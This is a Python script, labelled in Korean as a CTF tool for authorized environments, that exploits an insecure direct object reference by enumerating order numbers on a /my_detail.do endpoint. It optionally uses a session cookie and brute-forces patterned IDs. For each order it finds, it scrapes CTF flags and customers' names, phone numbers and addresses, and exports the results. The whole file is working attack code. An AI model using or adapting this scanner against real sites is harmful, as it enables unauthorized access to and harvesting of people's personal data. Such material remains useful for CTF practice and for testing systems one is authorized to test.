#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) 스캐너
CTF 대회용 - 승인된 환경에서만 사용하세요!
"""

import requests
import sys
import re
from urllib.parse import urljoin

class IDORScanner:
    def __init__(self, base_url, session_cookie=None):
        self.base_url = base_url
        self.detail_url = urljoin(base_url, "/my_detail.do")
        self.session = requests.Session()
        
        if session_cookie:
            self.session.cookies.set('JSESSIONID', session_cookie)
    
    def scan_order_range(self, start=1, end=100):
        """주문 번호 범위 스캔"""
        print(f"[*] Scanning order numbers from {start} to {end}...")
        
        found_orders = []
        flags_found = []
        
        for order_no in range(start, end + 1):
            params = {"order_no": order_no}
            
            try:
                response = self.session.get(self.detail_url, params=params, timeout=5)
                
                # 성공적으로 데이터를 가져왔는지 확인
                if response.status_code == 200:
                    # 주문 정보가 있는지 확인
                    if any(keyword in response.text for keyword in ["주문자", "ORDER_NAME", "배송지", "상품명"]):
                        print(f"[+] Order {order_no}: Found valid order")
                        found_orders.append(order_no)
                        
                        # 플래그 확인
                        if "FLAG{" in response.text:
                            flags = re.findall(r'FLAG\{[^}]+\}', response.text)
                            if flags:
                                print(f"[SUCCESS] Flag found in order {order_no}:")
                                for flag in flags:
                                    print(f"    {flag}")
                                    flags_found.append((order_no, flag))
                        
                        # 주문자 정보 추출
                        self._extract_order_info(response.text, order_no)
                    
                    elif "error" in response.text.lower() or "없습니다" in response.text:
                        pass  # 주문이 없음
                    else:
                        print(f"[?] Order {order_no}: Unusual response")
                
                # 진행 상황 표시
                if order_no % 10 == 0:
                    print(f"[*] Progress: {order_no}/{end}")
                    
            except Exception as e:
                print(f"[-] Error scanning order {order_no}: {e}")
        
        return found_orders, flags_found
    
    def _extract_order_info(self, html, order_no):
        """주문 정보 추출"""
        # 간단한 정보 추출 (실제로는 더 정교한 파싱 필요)
        
        # 이름 추출
        name_match = re.search(r'주문자[:\s]*([가-힣a-zA-Z]+)', html)
        if name_match:
            print(f"    Name: {name_match.group(1)}")
        
        # 전화번호 추출
        phone_match = re.search(r'(\d{3}-\d{4}-\d{4})', html)
        if phone_match:
            print(f"    Phone: {phone_match.group(1)}")
        
        # 주소 추출
        addr_match = re.search(r'주소[:\s]*([가-힣0-9\s,.-]+)', html)
        if addr_match:
            addr = addr_match.group(1)[:50]
            print(f"    Address: {addr}...")
    
    def scan_specific_orders(self, order_numbers):
        """특정 주문 번호들만 스캔"""
        print(f"[*] Scanning specific order numbers: {order_numbers}")
        
        results = {}
        
        for order_no in order_numbers:
            params = {"order_no": order_no}
            
            try:
                response = self.session.get(self.detail_url, params=params, timeout=5)
                
                if response.status_code == 200 and "주문자" in response.text:
                    print(f"[+] Order {order_no}: Accessible")
                    results[order_no] = response.text
                    
                    # 플래그 확인
                    if "FLAG{" in response.text:
                        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
                        print(f"[SUCCESS] Flags in order {order_no}: {flags}")
                else:
                    print(f"[-] Order {order_no}: Not accessible")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return results
    
    def brute_force_with_patterns(self):
        """패턴 기반 브루트포스"""
        print("[*] Trying common order number patterns...")
        
        patterns = [
            # 특수한 번호들
            [1, 10, 100, 1000],
            # 연속된 숫자
            [111, 222, 333, 444, 555, 666, 777, 888, 999],
            # 1337 (leet), 9999 등
            [1337, 7331, 9999, 8888],
            # 날짜 기반 (20241107 등)
            [20240101, 20241107],
        ]
        
        all_patterns = []
        for pattern in patterns:
            all_patterns.extend(pattern)
        
        return self.scan_specific_orders(all_patterns)
    
    def export_results(self, found_orders, flags_found, filename="idor_results.txt"):
        """결과를 파일로 저장"""
        print(f"\n[*] Exporting results to {filename}...")
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("IDOR Scan Results\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Total orders found: {len(found_orders)}\n")
            f.write(f"Order numbers: {found_orders}\n\n")
            
            if flags_found:
                f.write("Flags Found:\n")
                for order_no, flag in flags_found:
                    f.write(f"  Order {order_no}: {flag}\n")
            else:
                f.write("No flags found\n")
        
        print(f"[+] Results exported to {filename}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python idor_scanner.py <target_url> [start] [end] [session_cookie]")
        print("Example: python idor_scanner.py http://localhost:8080")
        print("Example: python idor_scanner.py http://localhost:8080 1 1000")
        print("Example: python idor_scanner.py http://localhost:8080 1 100 ABC123XYZ")
        sys.exit(1)
    
    target = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    session_cookie = sys.argv[4] if len(sys.argv) > 4 else None
    
    print("=" * 60)
    print("IDOR Scanner")
    print("Target:", target)
    print(f"Range: {start} - {end}")
    if session_cookie:
        print(f"Session: {session_cookie[:10]}...")
    print("=" * 60)
    
    scanner = IDORScanner(target, session_cookie)
    
    # 1. 범위 스캔
    found_orders, flags_found = scanner.scan_order_range(start, end)
    
    print("\n" + "=" * 60)
    print(f"Scan completed!")
    print(f"Found {len(found_orders)} accessible orders")
    print(f"Found {len(flags_found)} flags")
    print("=" * 60)
    
    # 2. 패턴 기반 스캔
    if len(found_orders) == 0:
        print("\n[*] No orders found in range, trying pattern-based scan...")
        scanner.brute_force_with_patterns()
    
    # 3. 결과 저장
    if found_orders or flags_found:
        scanner.export_results(found_orders, flags_found)
    
    # 4. 플래그 요약
    if flags_found:
        print("\n" + "=" * 60)
        print("FLAGS FOUND:")
        for order_no, flag in flags_found:
            print(f"  Order {order_no}: {flag}")
        print("=" * 60)

if __name__ == "__main__":
    main()
